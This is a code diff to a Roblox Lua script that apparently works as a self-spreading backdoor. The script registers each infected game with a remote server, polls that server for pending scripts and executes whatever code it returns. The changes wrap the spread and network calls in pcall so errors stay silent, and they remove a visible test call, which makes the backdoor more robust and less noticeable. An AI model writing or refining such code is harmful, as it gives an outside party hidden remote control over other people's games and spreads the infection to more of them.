@@ -20,23 +20,29 @@ local function getPendings()
 	return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(b .. "api/pendingScripts"))
 end
 spawn(function()
-	spread()
+	pcall(spread)
 	while wait(30) do
-		spread()
+		pcall(spread)
 	end
 end)
 spawn(function()
-	game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
+	pcall(function()
+game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
 		placeId = game.PlaceId,
 		displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
 	}), Enum.HttpContentType.ApplicationJson)
+
+			end)
 	while wait(20) do
-		game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
+		pcall(function()
+game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
 			placeId = game.PlaceId,
 			displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
 		}), Enum.HttpContentType.ApplicationJson)
+
+				end)
 	end
 end)
 local function execCode(code)
@@ -44,10 +50,11 @@ local function execCode(code)
 peerAnd(code)()
     end)
 end
-execCode("workspace.Name = 'test'")
+
 spawn(function()
 	while wait(5) do
-		local pendings = getPendings()
+		pcall(function()
+local pendings = getPendings()
 		warn(pendings)
 		for _, scr in pairs(pendings) do
 			if not table.find(execedAlready, scr.uniqueId) then 
@@ -58,5 +65,7 @@ spawn(function()
         end
 			
 		end
+
+				end)
 	end
 end)
